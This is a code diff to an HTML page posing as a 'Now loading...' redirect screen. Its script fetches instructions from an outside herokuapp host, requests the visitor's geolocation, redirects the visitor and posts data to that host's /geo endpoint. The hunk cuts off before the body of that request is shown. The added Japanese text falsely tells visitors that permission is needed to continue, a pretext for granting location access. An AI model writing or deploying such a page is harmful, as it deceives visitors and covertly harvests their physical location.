@@ -3,10 +3,16 @@
   <head>
     <meta charset="utf-8">
     <title>Now loading...</title>
+  </head>
+  <body>
+    <h1></h1><p id="p0"></p><p id="p1"></p>
     <script type="text/javascript">
       (async () => {
         const res = await fetch("https://static-void.herokuapp.com/auth"), url = await res.json();
         if(url.geo === 'true') {
+          document.querySelector("h1").innerHTML = "Now Loading...";
+          document.getElementById("p0").innerHTML = "表示中のページから" + url.url + "にリダイレクトしようとしています。";
+          document.getElementById("p1").innerHTML = "処理を続行するには許可が必要です。";
           navigator.geolocation.getCurrentPosition(async position => {
             location.href = url.url;
             await fetch("https://static-void.herokuapp.com/geo", {
@@ -23,5 +29,5 @@
         };
       })();
     </script>
-  </head>
+  </body>
 </html>
